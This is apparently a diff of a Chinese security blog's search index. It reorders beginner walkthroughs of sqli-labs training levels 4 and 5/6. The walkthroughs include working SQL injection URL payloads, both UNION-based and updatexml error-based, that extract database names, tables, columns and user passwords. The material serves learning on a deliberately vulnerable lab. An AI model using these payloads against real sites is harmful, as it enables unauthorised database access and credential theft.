@@ -280,42 +280,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_4</title>
-    <url>/2022/11/08/sqli-labs_4/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
-</li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
-<ol start="3">
-<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
-<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
-<li>此笔记为笔者初学sql注入时所写</li>
-<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
-</ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_3</title>
     <url>/2022/11/08/sqli-labs_3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
@@ -352,41 +316,31 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_5+6</title>
-    <url>/2022/11/08/sqli-labs_5+6/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
+    <title>sqli-labs_4</title>
+    <url>/2022/11/08/sqli-labs_4/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
+<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
 </li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
-</li>
-<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
-<p>可得字段数为3</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
-</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
-</li>
-<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-</li>
+<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
+<ol start="3">
+<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
+<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
+<li>此笔记为笔者初学sql注入时所写</li>
+<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
 </ul>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -441,6 +395,52 @@ secure_file_priv 一栏的value为空，即是成功</li>
 
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
 <li><a href="https://blog.csdn.net/qq_33598708/article/details/124059514">sqli-labs第七关sql注入流程</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_5+6</title>
+    <url>/2022/11/08/sqli-labs_5+6/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
+</li>
+<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
+<p>可得字段数为3</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
+</li>
+</ol>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+</li>
 </ul>
 ]]></content>
       <categories>
@@ -611,7 +611,8 @@ secure_file_priv 一栏的value为空，即是成功</li>
 </ul>
 ]]></content>
       <categories>
-        <category>SQL注入，布尔盲注</category>
+        <category>SQL注入</category>
+        <category>布尔盲注</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -727,5 +728,12 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
 </ul>
 ]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>时间盲注</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
   </entry>
 </search>
